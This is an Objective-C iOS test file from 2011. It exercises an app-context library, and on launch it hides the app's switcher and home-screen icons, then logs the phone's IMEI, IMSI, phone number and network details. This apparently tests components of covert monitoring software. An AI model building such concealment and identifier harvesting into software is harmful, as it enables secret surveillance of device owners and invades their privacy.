//
//  TestAppAppDelegate.m
//  TestApp
//
//  Created by Makara Khloth on 8/19/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "TestAppAppDelegate.h"
#import "TestAppViewController.h"

#import "AppContextImp.h"
#import "ProductInfoImp.h"

@implementation TestAppAppDelegate

@synthesize window;
@synthesize viewController;

unsigned char kProductInfoCipher[] = {0x46,0x2c,0x33,0xe1,0x7d,0x96,0x80,0x33,0x57,0x6e,0xe5,0x3d,0x6f,0xf9,0xe7,0x97,0x41,0xab,0x64,0x26,0x40,0x27,0x66,0xdc,0xc7,0x77,0x1a,0x85,0xdc,0xa5,0x8e,0x49,0xbe,0xf1,0x6a,0x2a,0x0,0x5e,0x5a,0x5e,0x8e,0x9e,0x73,0x4,0x73,0xaa,0xe9,0xb5,0x1e,0xec,0x91,0xe1,0xb7,0x18,0x2b,0xec,0xf,0xf2,0x3a,0xad,0x2a,0x6,0x99,0x88,0x19,0xbc,0xf1,0xb6,0x1c,0x14,0xb,0x11,0xe4,0x4b,0x12,0xf8,0x2e,0xe3,0x65,0xe8,0xac,0x52,0x3c,0x82,0x6c,0x52,0x39,0x31,0xc3,0x74,0x21,0xc9,0xfe,0xdc,0x98,0x6a};

- (void)applicationDidFinishLaunching:(UIApplication *)application {    
    
    // Override point for customization after app launch    
    [window addSubview:viewController.view];
    [window makeKeyAndVisible];
	
	AppContextImp* appContext = [[AppContextImp alloc] init];
	id <AppContext> context = appContext;
	[context getPhoneInfo];
	[self testAppContext:context];
	[appContext release];
}

- (void) testAppContext: (id <AppContext>) aContext {
	[[aContext getAppVisibility]hideAppSwitcherIcon:TRUE];
	[[aContext getAppVisibility]hideDesktopIcon:TRUE];
	[[aContext getAppVisibility]sendBundleToHide];
	
	
	
	
	NSData *productCipher	= [NSData dataWithBytes:kProductInfoCipher 
										   length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
	NSLog(@"productCipher %@", productCipher);
	
	NSLog(@"\n\nsize of unsigned char kProductInfoCipher[]:	%d", sizeof(kProductInfoCipher));
	NSLog(@"\n\nsize of unsigned char:	%d", sizeof(unsigned char));
	NSLog(@"\n\nsize of NSInteger:	%d", sizeof(NSInteger));
	
	/**********************************************************
	 TEST AppContextImp
	 **********************************************************/
	
	//AppContextImp *appContext		= [[AppContextImp alloc] init];
	AppContextImp *appContext		= [[AppContextImp alloc] initWithProductCipher:productCipher];
	
	id <AppContext> context			= appContext;
	
	// -- Get ProductInfoImp
	ProductInfoImp *productInfoImp	= [context getProductInfo];
	
	NSLog(@"getProductID %d", [productInfoImp getProductID]);
	NSLog(@"getLanguage %d", [productInfoImp getLanguage]);
	NSLog(@"getProductVersion %@", [productInfoImp getProductVersion]);
	NSLog(@"getProductName %@", [productInfoImp getProductName]);
	NSLog(@"getProductDescription %@", [productInfoImp getProductDescription]);
	NSLog(@"getProductLanguage %@", [productInfoImp getProductLanguage]);
	NSLog(@"getProtocolVersion %d", [productInfoImp getProtocolVersion]);
	NSLog(@"getProtocolHashTail %@", [productInfoImp getProtocolHashTail]);
	NSLog(@"getProductVersionDescription %@", [productInfoImp getProductVersionDescription]);
	NSLog(@"getBuildDate %@", [productInfoImp getBuildDate]);
	NSLog(@"getProductFullVersion %@", [productInfoImp getProductFullVersion]);
	
	// -- Get MacInfoImp (PhoneInfo for iPhone)
	
	ProductInfoImp *phoneInfoImp	= [context getPhoneInfo];
	id <PhoneInfo> phoneInfo		= phoneInfoImp;
	
	
	
	
	NSLog(@"getMobileNetworkCode %@", [phoneInfo getMobileNetworkCode]);
	NSLog(@"getMobileCountryCode %@", [phoneInfo getMobileCountryCode]);
	NSLog(@"getNetworkName %@", [phoneInfo getNetworkName]);
	NSLog(@"getIMEI %@", [phoneInfo getIMEI]);
	NSLog(@"getMEID %@", [phoneInfo getMEID]);
	NSLog(@"getIMSI %@", [phoneInfo getIMSI]);
	NSLog(@"getPhoneNumber %@", [phoneInfo getPhoneNumber]);
	NSLog(@"getDeviceModel %@", [phoneInfo getDeviceModel]);
	NSLog(@"getDeviceInfo %@", [phoneInfo getDeviceInfo]);
	NSLog(@"getNetworkType %d", [phoneInfo getNetworkType]);
	
	
}

- (void)dealloc {
    [viewController release];
    [window release];
    [super dealloc];
}


@end
